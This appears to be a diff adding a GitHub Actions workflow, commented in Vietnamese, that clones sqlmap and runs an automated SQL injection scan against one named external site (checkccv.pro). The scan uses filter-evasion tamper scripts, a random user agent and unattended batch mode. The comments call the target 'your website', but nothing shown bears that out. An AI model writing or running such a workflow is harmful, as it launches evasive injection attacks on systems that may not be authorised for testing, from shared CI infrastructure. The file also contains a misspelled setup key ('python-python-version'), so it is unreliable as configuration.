@@ -1,0 +1,31 @@
+name: Run SQLMap Scan
+
+# Cho phép bạn bấm nút chạy thủ công từ giao diện GitHub
+on:
+  workflow_dispatch:
+
+jobs:
+  sqlmap-scan:
+    runs-on: ubuntu-latest
+
+    steps:
+    # 1. Tải mã nguồn từ repo của bạn (nếu cần)
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    # 2. Cài đặt Python môi trường cực mạnh
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-python-version: '3.10'
+
+    # 3. Cài đặt bản sqlmap mới nhất từ Github project
+    - name: Install SQLMap
+      run: |
+        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+    # 4. Kích hoạt lệnh quét website của bạn
+    - name: Execute SQLMap Scan
+      run: |
+        cd sqlmap-dev
+        python3 sqlmap.py -u "https://checkccv.pro/?action=home&category=5" --random-agent --tamper=space2comment,between,charencode,randomcase --delay=1 --threads=1 --batch
